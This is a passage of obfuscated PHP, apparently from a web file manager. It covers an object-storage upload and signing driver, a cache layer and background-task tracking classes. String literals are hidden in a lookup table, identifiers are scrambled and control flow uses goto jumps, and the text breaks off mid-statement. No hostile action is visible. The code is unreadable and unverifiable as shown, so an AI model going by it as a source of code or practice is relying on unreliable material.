$FÔ±ÓÇ©Í·; } public function uploadFormData($f›ì¤™À¢¶, $c„°¯‘×Ò = 3600) { $b¯ ô®‚Âø =& $_SERVER[Õİõş]; $A­„Æ‹™æã = $this->pathFather($f›ì¤™À¢¶); $CÉ‰’´â¹ã = $this->client->getHttpUploadPostParams($this->bucket, $A­„Æ‹™æã, $b¯ ô®‚Âø[181], $c„°¯‘×Ò); return array_merge((array) $CÉ‰’´â¹ã, array($b¯ ô®‚Âø[165] => $this->getHost())); } public function multiUploadFormData($AŒ­Óğˆ¬, $bª¼À²¡»“ = 3600) { $Då¼¢ùæ¡ =& $_SERVER[Õİõş]; $DĞÊ±‚Ùø® = gmdate($Då¼¢ùæ¡[204]); $d¤†°®ß§˜ = array(); $dæœ¥Òé± = $this->client->getUploadId($this->bucket, $AŒ­Óğˆ¬, $d¤†°®ß§˜); if (!$dæœ¥Òé±) { return !1; } return array($Då¼¢ùæ¡[205] => $dæœ¥Òé±, $Då¼¢ùæ¡[165] => $this->getHost() . $Då¼¢ùæ¡[8] . $this->pathEncode($AŒ­Óğˆ¬), $Då¼¢ùæ¡[206] => $DĞÊ±‚Ùø®, $Då¼¢ùæ¡[89] => $AŒ­Óğˆ¬); } public function multiUploadAuthData($EğÂ ¤¦º•, $Eé’ñîÂÒ = array()) { goto eŒØš½èÄÍ; fÓÜÆ¹ÜĞÕ: $bª¸—ÃåòĞ = array($a‘ëøšÔº¾[208], $a‘ëøšÔº¾[33], $a‘ëøšÔº¾[115], $a‘ëøšÔº¾[33], "\x78\55\141\155\x7a\x2d\144\141\x74\145\72{$b¢¤œâ¦Áä}", $a‘ëøšÔº¾[8] . $this->bucket . $a‘ëøšÔº¾[8] . $this->pathEncode($d¼†ÌÖ ÎÈ) . $F¦¶±¤ÈÓ); if (strpos($F¦¶±¤ÈÓ, $a‘ëøšÔº¾[209]) === 0) { $bª¸—ÃåòĞ[0] = $a‘ëøšÔº¾[210]; } if (isset($Eé’ñîÂÒ[$a‘ëøšÔº¾[211]]) && $Eé’ñîÂÒ[$a‘ëøšÔº¾[211]] == $a‘ëøšÔº¾[212]) { $bª¸—ÃåòĞ[0] = $a‘ëøšÔº¾[212]; } goto AèÀ¢£İ‡å; AèÀ¢£İ‡å: $b»¿„ß˜™» = implode($a‘ëøšÔº¾[213], $bª¸—ÃåòĞ); $FÆ˜ˆ¨Ã…í = base64_encode(hash_hmac($a‘ëøšÔº¾[214], $b»¿„ß˜™», $this->secret, !0)); $d‹Äã—…˜³ = $a‘ëøšÔº¾[215] . $this->accessKey . $a‘ëøšÔº¾[4] . $FÆ˜ˆ¨Ã…í; goto F–¸ˆ…°‰†; eŒØš½èÄÍ: $a‘ëøšÔº¾ =& $_SERVER[Õİõş]; $b¢¤œâ¦Áä = isset($Eé’ñîÂÒ[$a‘ëøšÔº¾[206]]) ? $Eé’ñîÂÒ[$a‘ëøšÔº¾[206]] : gmdate($a‘ëøšÔº¾[204]); $F¦¶±¤ÈÓ = isset($Eé’ñîÂÒ[$a‘ëøšÔº¾[156]]) ? $Eé’ñîÂÒ[$a‘ëøšÔº¾[156]] : $a‘ëøšÔº¾[33]; goto A²“êêŞÀ ; F–¸ˆ…°‰†: if (strpos($F¦¶±¤ÈÓ, $a‘ëøšÔº¾[209]) === 0) { return array($a‘ëøšÔº¾[216] => $d‹Äã—…˜³, $a‘ëøšÔº¾[206] => $b¢¤œâ¦Áä); } return $d‹Äã—…˜³; goto aÒ¾ãÃ‘¬; A²“êêŞÀ : $d¼†ÌÖ ÎÈ = $Eé’ñîÂÒ[$a‘ëøšÔº¾[89]]; unset($Eé’ñîÂÒ[$a‘ëøšÔº¾[89]]); if (isset($Eé’ñîÂÒ[$a‘ëøšÔº¾[207]])) { $Eé’ñîÂÒ[$a‘ëøšÔº¾[206]] = $b¢¤œâ¦Áä; return $this->listUploadParts($d¼†ÌÖ ÎÈ, $Eé’ñîÂÒ); } goto fÓÜÆ¹ÜĞÕ; aÒ¾ãÃ‘¬: } public function listUploadParts($EÖÄ¯äíÍ, $D¸À×ÕÎŠÃ = array()) { goto E÷å–‡é²; eÆºÁÎà¡: if (!$eíóˆğë­Œ) { return !1; } unset($D¸À×ÕÎŠÃ[$FëÏÙÄñ¼Ê[207]], $D¸À×ÕÎŠÃ[$FëÏÙÄñ¼Ê[211]]); $D¸À×ÕÎŠÃ[$FëÏÙÄñ¼Ê[89]] = $EÖÄ¯äíÍ; goto D°±¬ëî½¹; E÷å–‡é²: $FëÏÙÄñ¼Ê =& $_SERVER[Õİõş]; $a¢Ø¹õ± = str_replace($FëÏÙÄñ¼Ê[217], $FëÏÙÄñ¼Ê[33], $D¸À×ÕÎŠÃ[$FëÏÙÄñ¼Ê[156]]); $eíóˆğë­Œ = $this->client->listParts($this->bucket, $EÖÄ¯äíÍ, $a¢Ø¹õ±); goto eÆºÁÎà¡; D°±¬ëî½¹: $eÙĞÁ¿¿à = $this->multiUploadAuthData($EÖÄ¯äíÍ, $D¸À×ÕÎŠÃ); if (empty($eÙĞÁ¿¿à)) { return !1; } return array($FëÏÙÄñ¼Ê[216] => $eÙĞÁ¿¿à, $FëÏÙÄñ¼Ê[206] => $D¸À×ÕÎŠÃ[$FëÏÙÄñ¼Ê[206]], $FëÏÙÄñ¼Ê[218] => $eíóˆğë­Œ); goto BéÁà§œ‚Æ; BéÁà§œ‚Æ: } public function getHost() { return parent::getHost() . $_SERVER[Õİõş][8] . $this->bucket; } public function size($aêËÛ¨¦ôƒ) { $Fáš±ò¦Î¶ = $this->objectMeta($aêËÛ¨¦ôƒ); return $Fáš±ò¦Î¶ ? $Fáš±ò¦Î¶[$_SERVER[Õİõş][77]] : 0; } public function info($C ­æå¹Ì¨) { if ($this->isFolder($C ­æå¹Ì¨)) { return $this->folderInfo($C ­æå¹Ì¨); } else { if ($this->isFile($C ­æå¹Ì¨)) { return $this->fileInfo($C ­æå¹Ì¨); } } return !1; } public function exist($A²¶¦öêö) { return $this->isFile($A²¶¦öêö) || $this->isFolder($A²¶¦öêö); } public function isFile($F¨áº¨¤çï) { return !$this->isFolder($F¨áº¨¤çï) && $this->objectMeta($F¨áº¨¤çï); } public function isFolder($cÙ¥ßÇ‰Ùí) { return $this->cacheMethod($_SERVER[Õİõş][219], $cÙ¥ßÇ‰Ùí); } protected function objectMeta($föËÎƒ·Úä) { return $this->cacheMethod($_SERVER[Õİõş][220], $föËÎƒ·Úä); } protected function _objectMeta($eš²Œ•ÙÒÈ) { $dñ÷‡¸¾Í =& $_SERVER[Õİõş]; $eš²Œ•ÙÒÈ = rtrim($eš²Œ•ÙÒÈ, $dñ÷‡¸¾Í[8]); try { $d…‡ÅÌÙ = $this->client->getObjectInfo($this->bucket, $eš²Œ•ÙÒÈ); if (!isset($d…‡ÅÌÙ[$dñ÷‡¸¾Í[203]]) && isset($d…‡ÅÌÙ[$dñ÷‡¸¾Í[221]])) { $d…‡ÅÌÙ[$dñ÷‡¸¾Í[203]] = $d…‡ÅÌÙ[$dñ÷‡¸¾Í[221]]; } } catch (OSS\Core\OssException $C‰ÚÅâêÇ¸) { $d…‡ÅÌÙ = !1; } if (!$d…‡ÅÌÙ) { } return $d…‡ÅÌÙ; } protected function _isFolder($a‰¶²Ï¿İ) { goto A¹ùÙ™Ê¦‹; F®ñ÷“·Ãô: if (substr($E–Şä–îŒß[0][$D³Ì®ó”İ½[28]], -1) == $D³Ì®ó”İ½[8]) { return !0; } if (get_path_this($E–Şä–îŒß[0][$D³Ì®ó”İ½[28]]) == get_path_this($a‰¶²Ï¿İ)) { return !1; } return !0; goto fä¨Ïø““Ÿ; eºğ·åùõ: $E–Şä–îŒß = $this->client->getBucket($this->bucket, $a‰¶²Ï¿İ, null, 1); if (empty($E–Şä–îŒß)) { return !1; } $E–Şä–îŒß = array_values($E–Şä–îŒß); goto F®ñ÷“·Ãô; A¹ùÙ™Ê¦‹: $D³Ì®ó”İ½ =& $_SERVER[Õİõş]; $a‰¶²Ï¿İ = rtrim($a‰¶²Ï¿İ, $D³Ì®ó”İ½[8]); if ($a‰¶²Ï¿İ == $D³Ì®ó”İ½[33] || $a‰¶²Ï¿İ == $D³Ì®ó”İ½[8]) { return !0; } goto eºğ·åùõ; fä¨Ïø““Ÿ: } } define($_SERVER[Õİõş][222], 1); goto B´–¶ãó•ã; E„ãÙí¤Ä: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto BŞ‰Œ‰ìÎÁ; aéšÆ·ïŒ: switch ($dùá‡±Òİ¢[$CËÇçÒœ¹É[755]]) { case $CËÇçÒœ¹É[17]: self::$handle = Model($CËÇçÒœ¹É[757]); break; case $CËÇçÒœ¹É[758]: self::$handle = new CacheRedis($cùìÛßÛöµ, $d–ˆ¢ØÙ‰­); break; case $CËÇçÒœ¹É[759]: self::$handle = new CacheMemcached($cùìÛßÛöµ, $d–ˆ¢ØÙ‰­); break; case $CËÇçÒœ¹É[163]: self::$handle = new CacheFile($cùìÛßÛöµ, $d–ˆ¢ØÙ‰­); break; default: break; } return self::$handle; goto D³÷ô÷Ÿô«; d”¦¯Î¯©: $dùá‡±Òİ¢ = $GLOBALS[$CËÇçÒœ¹É[6]][$CËÇçÒœ¹É[333]]; $cùìÛßÛöµ = $dùá‡±Òİ¢[$dùá‡±Òİ¢[$CËÇçÒœ¹É[755]]]; $d–ˆ¢ØÙ‰­ = $dùá‡±Òİ¢[$CËÇçÒœ¹É[756]]; goto aéšÆ·ïŒ; BŞ‰Œ‰ìÎÁ: $CËÇçÒœ¹É =& $_SERVER[Õİõş]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto d”¦¯Î¯©; D³÷ô÷Ÿô«: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($dæÂèÁ‘ä) { if (is_array($dæÂèÁ‘ä) || is_object($dæÂèÁ‘ä)) { $dæÂèÁ‘ä = json_encode($dæÂèÁ‘ä); } $dæÂèÁ‘ä = rawurlencode($dæÂèÁ‘ä); return KOD_SITE_ID . $_SERVER[Õİõş][70] . $dæÂèÁ‘ä; } public static function get($c”ªÏßğì”) { $c¥«©ºŒÓ = self::key($c”ªÏßğì”); if (!isset(self::$memoryCache[$c¥«©ºŒÓ])) { $C²³¥£ì‰Õ = self::init()->get($c¥«©ºŒÓ); self::$memoryCache[$c¥«©ºŒÓ] = unserialize($C²³¥£ì‰Õ); } return self::$memoryCache[$c¥«©ºŒÓ]; } public static function set($bèÎ›²ã²½, $EË–…¡ãôŞ, $fˆê­ãÅË = false) { goto eŞˆ«ÜŠ’Î; b·ˆÚªÊİ: CacheLock::lock($bèÎ›²ã²½); $dÍ’“×’ = self::init()->set($a·å÷Òõ›¿, serialize($EË–…¡ãôŞ), $fˆê­ãÅË); self::$memoryCache[$a·å÷Òõ›¿] = $EË–…¡ãôŞ; goto D­İÛãÙÒ‡; eŞˆ«ÜŠ’Î: $a·å÷Òõ›¿ = self::key($bèÎ›²ã²½); if (isset(self::$memoryCache[$a·å÷Òõ›¿]) && self::$memoryCache[$a·å÷Òõ›¿] === $EË–…¡ãôŞ) { return !0; } if ($fˆê­ãÅË === 0) { self::$memoryCache[$a·å÷Òõ›¿] = $EË–…¡ãôŞ; return !0; } goto b·ˆÚªÊİ; D­İÛãÙÒ‡: CacheLock::unlock($bèÎ›²ã²½); return $dÍ’“×’; goto CË¦Şà–™á; CË¦Şà–™á: } public static function remove($cÅÛ‚¥í¸Ó) { goto BéÜ¤¡¢Ñ¾; BéÜ¤¡¢Ñ¾: $fŒƒ¡¾°ÃŞ = self::key($cÅÛ‚¥í¸Ó); unset(self::$memoryCache[$fŒƒ¡¾°ÃŞ]); self::clearTimeout(); goto B…¤ãÇµò; FŒ†Æéæ²¯: return $EŒÃ†ØÓ­; goto FƒÕ‡„îãô; B…¤ãÇµò: CacheLock::lock($cÅÛ‚¥í¸Ó); $EŒÃ†ØÓ­ = self::init()->remove($fŒƒ¡¾°ÃŞ); CacheLock::unlock($cÅÛ‚¥í¸Ó); goto FŒ†Æéæ²¯; FƒÕ‡„îãô: } public static function clearMemory($AÅÍ™ÊïÀ– = false) { if ($AÅÍ™ÊïÀ–) { $AÅÍ™ÊïÀ– = self::key($AÅÍ™ÊïÀ–); unset(self::$memoryCache[$AÅÍ™ÊïÀ–]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Õİõş][760])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Õİõş][761])) { self::init()->clearTimeout(); } } } $a†»¹¡¶„‚ = LIB_DIR . $_SERVER[Õİõş][762]; $B¼³ùİ… = $_SERVER[Õİõş][763]; goto DññÍÜô£¸; Bâ¨Óç·Åê: class Task { const STATYS_STOP = "\x73\164\157\160"; const STATYS_RUNNING = "\162\165\x6e\156\x69\156\147"; const STATYS_KILL = "\153\151\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($dç—±Ê, $cé¨æ¨Å¥Ô = '', $c¡ÛÙó³ùÌ = 0, $e—öÈ±´°³ = '') { goto B»¬›ˆêùÁ; B»¬›ˆêùÁ: $aÊ‚éñøŒ =& $_SERVER[Õİõş]; if (self::get($dç—±Ê)) { return; } $this->task = array($aÊ‚éñøŒ[363] => $dç—±Ê, $aÊ‚éñøŒ[1417] => USER_ID, $aÊ‚éñøŒ[1325] => $e—öÈ±´°³, $aÊ‚éñøŒ[29] => $cé¨æ¨Å¥Ô, $aÊ‚éñøŒ[982] => $aÊ‚éñøŒ[33], $aÊ‚éñøŒ[980] => $c¡ÛÙó³ùÌ, $aÊ‚éñøŒ[992] => 0, $aÊ‚éñøŒ[1418] => 0, $aÊ‚éñøŒ[1419] => 0, $aÊ‚éñøŒ[1420] => timeFloat(), $aÊ‚éñøŒ[1421] => 0, $aÊ‚éñøŒ[1422] => 0, $aÊ‚éñøŒ[1423] => 0, $aÊ‚éñøŒ[1424] => 0, $aÊ‚éñøŒ[691] => $aÊ‚éñøŒ[1381]); goto B‚Üù¥§…ö; fø­…ËÄ: Hook::trigger($aÊ‚éñøŒ[1428], $this->task); $this->task[$aÊ‚éñøŒ[1422]] = timeFloat(); self::valueSet($this->task[$aÊ‚éñøŒ[363]], $this->task); goto fÁ”…¼“ç¥; B‚Üù¥§…ö: Hook::bind($aÊ‚éñøŒ[1383], array($this, $aÊ‚éñøŒ[1425])); Hook::bind($aÊ‚éñøŒ[1426], array($this, $aÊ‚éñøŒ[1427])); $this->startAfter(); goto fø­…ËÄ; fÁ”…¼“ç¥: } public function end() { goto e¤âôÑ‰É¨; aÔ»İ½­¤: Hook::unbind($B•Ş¡šìë[1426], array($this, $B•Ş¡šìë[1427])); $this->endAfter(); $this->task = !1; goto c °İ”ƒ½Ô; e¤âôÑ‰É¨: $B•Ş¡šìë =& $_SERVER[Õİõş]; if (!$this->task) { return; } if ($this->task[$B•Ş¡šìë[1422]]) { self::valueSet($this->task[$B•Ş¡šìë[363]], !1); } goto aà¸ŒÂ¹¹¾; aà¸ŒÂ¹¹¾: $bè£à‘’¯é = timeFloat() - $this->task[$B•Ş¡šìë[1420]]; self::log($B•Ş¡šìë[1429] . $this->task[$B•Ş¡šìë[363]] . $B•Ş¡šìë[1430] . $bè£à‘’¯é . $B•Ş¡šìë[1431]); Hook::unbind($B•Ş¡šìë[1383], array($this, $B•Ş¡šìë[1425])); goto aÔ»İ½­¤; c °İ”ƒ½Ô: } public function update($c¶–ÀçÓã = 0) { goto AëÎšİÚñ; A‚×…ˆ¥´Û: Hook::trigger($f¥Ê¶ŠñÄ[1435], $b‘Ä°±ÖÆÆ); self::valueSet($b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[363]], $b‘Ä°±ÖÆÆ); goto Fº™¹ÉÏ•ğ; E‡Úå°•‹Õ: $bğ—·àğ× = self::get($b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[363]]); $B­å±Òª = $bğ—·àğ×[$f¥Ê¶ŠñÄ[691]]; if ($B­å±Òª == self::STATYS_KILL) { $BùæÚ¿Ï¥ = array($f¥Ê¶ŠñÄ[1432] => LNG($f¥Ê¶ŠñÄ[1433]), $f¥Ê¶ŠñÄ[1035] => !1); Cache::set($f¥Ê¶ŠñÄ[1434] . $this->task[$f¥Ê¶ŠñÄ[363]], $BùæÚ¿Ï¥, 30); $this->end(); die; } else { if ($B­å±Òª == self::STATYS_STOP) { $Cß“‹é¸˜ = 2; $bğ—·àğ×[$f¥Ê¶ŠñÄ[1423]] += $Cß“‹é¸˜; self::valueSet($b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[363]], $bğ—·àğ×); sleep($Cß“‹é¸˜); $this->update(); return; } } goto A³…Šá‹Â„; AëÎšİÚñ: $f¥Ê¶ŠñÄ =& $_SERVER[Õİõş]; $b‘Ä°±ÖÆÆ =& $this->task; if (!$b‘Ä°±ÖÆÆ) { return; } goto CÁÛŸÏá¬‚; DÊ›©Ä¹Ÿà: $this->updateAfter(); $F‚¢¡Æ½Ğà = 0.2; if (timeFloat() - $b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[1422]] < $F‚¢¡Æ½Ğà) { return; } goto E‡Úå°•‹Õ; A³…Šá‹Â„: $b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[691]] = $B­å±Òª ? $B­å±Òª : $b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[691]]; $b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[1423]] = $bğ—·àğ×[$f¥Ê¶ŠñÄ[1423]] ? $bğ—·àğ×[$f¥Ê¶ŠñÄ[1423]] : 0; $b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[1422]] = timeFloat(); goto A‚×…ˆ¥´Û; CÁÛŸÏá¬‚: $b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[992]] += $c¶–ÀçÓã; $b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[1421]] = timeFloat(); if ($b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[980]]) { if ($b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[980]] < $b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[992]]) { $b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[980]] = $b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[992]]; } $C¬¹Ë§«Ö = timeFloat() - $b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[1420]] - $b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[1423]]; $b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[1418]] = $b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[992]] / $b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[980]]; $b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[1419]] = $b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[992]] / $C¬¹Ë§«Ö; if ($b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[1418]] > 0) { $b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[1424]] = $C¬¹Ë§«Ö * (1 - $b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[1418]]) / $b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[1418]]; } $b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[1424]] = $b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[1424]] <= 0 ? 0 : $b‘Ä°±ÖÆÆ[$f¥Ê¶ŠñÄ[1424]]; } goto DÊ›©Ä¹Ÿà; Fº™¹ÉÏ•ğ: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Cƒ¯ÛÎ³ô¢) { $c·á®‚Š»î =& $_SERVER[Õİõş]; Cache::set($c·á®‚Š»î[1434] . $this->task[$c·á®‚Š»î[363]], $Cƒ¯ÛÎ³ô¢, 60); return $Cƒ¯ÛÎ³ô¢; } public static function get($Fí÷Ê©Ü¬) { return self::valueGet($Fí÷Ê©Ü¬); } public static function listData() { $Bç˜¢ƒíå = self::valueGet(); return array_sort_by($Bç˜¢ƒíå, $_SERVER[Õİõş][1420], !0); } public static function kill($Bï‡İ‰ãá) { return self::changeStatus($Bï‡İ‰ãá, self::STATYS_KILL); } public static function stop($b¹‹•»Ö‹Ò) { return self::changeStatus($b¹‹•»Ö‹Ò, self::STATYS_STOP); } public static function restart($A­¼µŠ²îç) { return self::changeStatus($A­¼µŠ²îç, self::STATYS_RUNNING); } public static function killAll() { $bòÀ ®ïó… =& $_SERVER[Õİõş]; $b˜¥ Ë…’ = self::listData(); foreach ($b˜¥ Ë…’ as $eÄÜæ¯ò) { self::kill($eÄÜæ¯ò[$bòÀ ®ïó…[363]]); } sleep(2); foreach ($b˜¥ Ë…’ as $eÄÜæ¯ò) { self::valueSet($eÄÜæ¯ò[$bòÀ ®ïó…[363]], !1); } } private static function changeStatus($e óÓÜª› , $BÓéêĞã) { goto E¨ø…‡°ê‡; D¦È£ò§®–: $fëï÷ÅŠñÚ[$cÒñ³¢Ê½÷[691]] = $BÓéêĞã; self::valueSet($e óÓÜª› , $fëï÷ÅŠñÚ); self::log($cÒñ³¢Ê½÷[1436] . $fëï÷ÅŠñÚ[$cÒñ³¢Ê½÷[363]] . $cÒñ³¢Ê½÷[1437] . $BÓéêĞã); goto a¿Šù²¶; E¨ø…‡°ê‡: $cÒñ³¢Ê½÷ =& $_SERVER[Õİõş]; $fëï÷ÅŠñÚ = self::valueGet($e óÓÜª› ); if (!$fëï÷ÅŠñÚ) { return !1; } goto D¦È£ò§®–; a¿Šù²¶: return !0; goto BØ¢“ì“«Ù; BØ¢“ì“«Ù: } public static function valueGet($fô©´¢å› = false) { $B•Ï¸Ú“³¾ =& $_SERVER[Õİõş]; if ($fô©´¢å›) { $F™²º«¶ªä = Model($B•Ï¸Ú“³¾[394])->where(array($B•Ï¸Ú“³¾[89] => $fô©´¢å›, $B•Ï¸Ú“³¾[29] => $B•Ï¸Ú“³¾[1438]))->find(); return $F™²º«¶ªä ? json_decode($F™²º«¶ªä[$B•Ï¸Ú“³¾[355]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Dç”‡Ç°Óµ = false) { goto E÷¹ÇŞ¿À£; DÙ„÷Ú‚Íõ: return $d‘á‘ñÕŞµ; goto báÃ„³¾‰µ; E÷¹ÇŞ¿À£: $bØÇŸÔ‡îÌ =& $_SERVER[Õİõş]; $A¶é„¶ºéö = array($bØÇŸÔ‡îÌ[29] => $bØÇŸÔ‡îÌ[1438]); if ($Dç”‡Ç°Óµ) { $A¶é„¶ºéö[$bØÇŸÔ‡îÌ[1417]] = $Dç”‡Ç°Óµ; } goto DÛ­•æùÅ«; DÛ­•æùÅ«: $d‘á‘ñÕŞµ = Model($bØÇŸÔ‡îÌ[394])->where($A¶é„¶ºéö)->select(); $d‘á‘ñÕŞµ = $d‘á‘ñÕŞµ ? $d‘á‘ñÕŞµ : array(); foreach ($d‘á‘ñÕŞµ as $e‰“ã¿º => $dì‚«Ç‘ùš) { $d‘á‘ñÕŞµ[$e‰“ã¿º] = json_decode($dì‚«Ç‘ùš[$bØÇŸÔ‡îÌ[355]], !0); } goto DÙ„÷Ú‚Íõ; báÃ„³¾‰µ: } public static function valueSet($bó¸ ›Õµ¶, $AéÊŸÊºù) { goto føÌ’Ø‘“‰; føÌ’Ø‘“‰: $Eğ¾Âå… =& $_SERVER[Õİõş]; if (!$AéÊŸÊºù) { return Model($Eğ¾Âå…[394])->where(array($Eğ¾Âå…[89] => $bó¸ ›Õµ¶, $Eğ¾Âå…[29] => $Eğ¾Âå…[1438]))->delete(); } $AÏ«Šïâ»‘ = json_encode($AéÊŸÊºù); goto Aç‘‹âéì; Aç‘‹âéì: if (!$AÏ«Šïâ»‘) { ob_start(); var_dump($AéÊŸÊºù); $fïîÔçì©È = ob_get_clean(); self::log($Eğ¾Âå…[1439] . json_encode_force($fïîÔçì©È)); } if (!$bó¸ ›Õµ¶ || !$AéÊŸÊºù[$Eğ¾Âå…[363]]) { return !1; } $C²Òá…Î = array($Eğ¾Âå…[29] => $Eğ¾Âå…[1438], $Eğ¾Âå…[1417] => USER_ID, $Eğ¾Âå…[89] => $bó¸ ›Õµ¶, $Eğ¾Âå…[355] => $AÏ«Šïâ»‘); goto bø¿‘°ŞÚŠ; bø¿‘°ŞÚŠ: Model($Eğ¾Âå…[394])->add($C²Òá…Î, array(), !0); goto D×ºòÄ¢‚¸; D×ºòÄ¢‚¸: } public static function log($c•¦ˆœÇˆˆ) { write_log($c•¦ˆœÇˆˆ, $_SERVER[Õİõş][1440]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto Bëæ ìó‘­; bæ«×¡ŒÆç: Hook::bind($bî®ËçÃÉí[506], array($this, $bî®ËçÃÉí[1450])); Hook::bind($bî®ËçÃÉí[508], array($this, $bî®ËçÃÉí[1450])); Hook::bind($bî®ËçÃÉí[510], array($this, $bî®ËçÃÉí[1450])); goto eäˆ»À¹©Ã; fÊÊËãœÙ§: Hook::bind($bî®ËçÃÉí[1441], array($this, $bî®ËçÃÉí[1442])); Hook::bind($bî®ËçÃÉí[1443], array($this, $bî®ËçÃÉí[1444])); Hook::bind($bî®ËçÃÉí[1445], array($this, $bî®ËçÃÉí[1446])); goto b³’Ç„•ãÜ; eäˆ»À¹©Ã: Hook::bind($bî®ËçÃÉí[1451], array($this, $bî®ËçÃÉí[1452])); Hook::bind($bî®ËçÃÉí[527], array($this, $bî®ËçÃÉí[1453])); $this->sourceModelCopyFlag = !1; goto d¥ÊİÈ®½„; CãäÎĞôğŞ: Hook::bind($bî®ËçÃÉí[538], array($this, $bî®ËçÃÉí[1449])); Hook::bind($bî®ËçÃÉí[504], array($this, $bî®ËçÃÉí[1450])); Hook::bind($bî®ËçÃÉí[501], array($this, $bî®ËçÃÉí[1450])); goto bæ«×¡ŒÆç; d¥ÊİÈ®½„: Hook::bind($bî®ËçÃÉí[1454], array($this, $bî®ËçÃÉí[1455])); Hook::bind($bî®ËçÃÉí[1456], array($this, $bî®ËçÃÉí[1457])); Hook::bind($bî®ËçÃÉí[1458], array($this, $bî®ËçÃÉí[1459])); goto f‘ßÆß¤¬ƒ; f‘ßÆß¤¬ƒ: $aº´·…‰Š[$bî®ËçÃÉí[1460]] = LNG($bî®ËçÃÉí[1461]); $aº´·…‰Š[$bî®ËçÃÉí[1462]] = 0; $aº´·…‰Š[$bî®ËçÃÉí[1463]] = 0; goto A£â¤ÊëÛ£; C¤ÀâÔŸ…×: if (!$aº´·…‰Š[$bî®ËçÃÉí[1325]]) { $aº´·…‰Š[$bî®ËçÃÉí[1325]] = LNG($bî®ËçÃÉí[1466]); } goto a§ò³Ä„²; A£â¤ÊëÛ£: $aº´·…‰Š[$bî®ËçÃÉí[982]] = $bî®ËçÃÉí[33]; $aº´·…‰Š[$bî®ËçÃÉí[1464]] = $bî®ËçÃÉí[33]; $aº´·…‰Š[$bî®ËçÃÉí[1465]] = 0; goto C¤ÀâÔŸ…×; Bëæ ìó‘­: $bî®ËçÃÉí =& $_SERVER[Õİõş]; $aº´·…‰Š =& $this->task; $this->sourceCopyFolder = !1; goto fÊÊËãœÙ§; b³’Ç„•ãÜ: Hook::bind($bî®ËçÃÉí[534], array($this, $bî®ËçÃÉí[1447])); Hook::bind($bî®ËçÃÉí[535], array($this, $bî®ËçÃÉí[1448])); Hook::bind($bî®ËçÃÉí[537], array($this, $bî®ËçÃÉí[1449])); goto CãäÎĞôğŞ; a§ò³Ä„²: } protected function endAfter() { goto f•ˆôĞÜÎ¿; f•ˆôĞÜÎ¿: $E  óÇ…›£ =& $_SERVER[Õİõş]; Hook::unbind($E  óÇ…›£[1441], array($this, $E  óÇ…›£[1442])); Hook::unbind($E  óÇ…›£[1443], array($this, $E  óÇ…›£[1444])); goto DøèªÎÜæ¢; DøèªÎÜæ¢: Hook::unbind($E  óÇ…›£[1445], array($this, $E  óÇ…›£[1446])); Hook::unbind($E  óÇ…›£[534], array($this, $E  óÇ…›£[1447])); Hook::unbind($E  óÇ…›£[535], array($this, $E  óÇ…›£[1448])); goto F’„÷˜ùƒ; F’„÷˜ùƒ: Hook::unbind($E  óÇ…›£[537], array($this, $E  óÇ…›£[1449])); Hook::unbind($E  óÇ…›£[538], array($this, $E  óÇ…›£[1449])); Hook::unbind($E  óÇ…›£[504], array($this, $E  óÇ…›£[1450])); goto EÃ®ÌÅ²ï; EÃ®ÌÅ²ï: Hook::unbind($E  óÇ…›£[501], array($this, $E  óÇ…›£[1450])); Hook::unbind($E  óÇ…›£[506], array($this, $E  óÇ…›£[1450])); Hook::unbind($E  óÇ…›£[508], array($this, $E  óÇ…›£[1450])); goto aØáÜğï«; d“¤½†µ›¹: Hook::unbind($E  óÇ…›£[1454], array($this, $E  óÇ…›£[1455])); Hook::unbind($E  óÇ…›£[1456], array($this, $E  óÇ…›£[1457])); Hook::unbind($E  óÇ…›£[1458], array($this, $E  óÇ…›£[1459])); goto c‡õ˜°·; aØáÜğï«: Hook::unbind($E  óÇ…›£[510], array($this, $E  óÇ…›£[1450])); Hook::unbind($E  óÇ…›£[1451], array($this, $E  óÇ…›£[1452])); Hook::unbind($E  óÇ…›£[527], array($this, $E  óÇ…›£[1453])); goto d“¤½†µ›¹; c‡õ˜°·: } public function copyMoveStart($b†Øášó, $c¬‘¤©¡³Ö, $bŸ—»¼èèÔ, $EŒ¤ïÖì‹¬) { } public function updateAfter() { goto FÊ½ªÉ¸ß; d½èÕÚøÙ: if 